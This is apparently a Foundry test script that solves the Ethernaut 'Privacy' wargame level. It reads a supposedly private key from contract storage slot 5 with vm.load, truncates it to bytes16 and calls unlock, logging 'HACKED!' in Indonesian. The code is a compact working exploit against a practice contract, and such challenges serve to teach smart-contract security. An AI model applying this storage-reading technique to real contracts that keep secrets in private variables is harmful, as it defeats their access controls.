// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

interface IPrivacy {
    function unlock(bytes16 _key) external;
    function locked() external view returns (bool);
}

interface IEthernaut {
    function createLevelInstance(address _level) external payable;
    function submitLevelInstance(address _instance) external;
}

contract EthernautPrivacyTest is Test {
    IEthernaut ethernaut = IEthernaut(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);
    address levelFactory = 0x131c3249e115491E83De375171767Af07906eA36;

    function testLevel12_Privacy() public {
        address hacker = makeAddr("hacker");
        vm.startPrank(hacker);

        vm.recordLogs();
        ethernaut.createLevelInstance(levelFactory);
        
        Vm.Log[] memory entries = vm.getRecordedLogs();
        bytes32 instanceTopic = entries[entries.length - 1].topics[2];
        address levelAddr = address(uint160(uint256(instanceTopic)));
        
        IPrivacy privacy = IPrivacy(levelAddr);
        console.log("Status Locked Awal:", privacy.locked());

        console.log("Membaca Slot 5...");
        
        bytes32 data2 = vm.load(levelAddr, bytes32(uint256(5)));
        
        console.log("Data Slot 5 (Full):");
        console.logBytes32(data2);

        bytes16 key = bytes16(data2);
        
        console.log("Key (Bytes16):");
        console.logBytes16(key);

        privacy.unlock(key);

        console.log("Status Locked Akhir:", privacy.locked());
        assertEq(privacy.locked(), false);
        console.log("HACKED! Privasi terbongkar.");

        ethernaut.submitLevelInstance(levelAddr);
        vm.stopPrank();
    }
}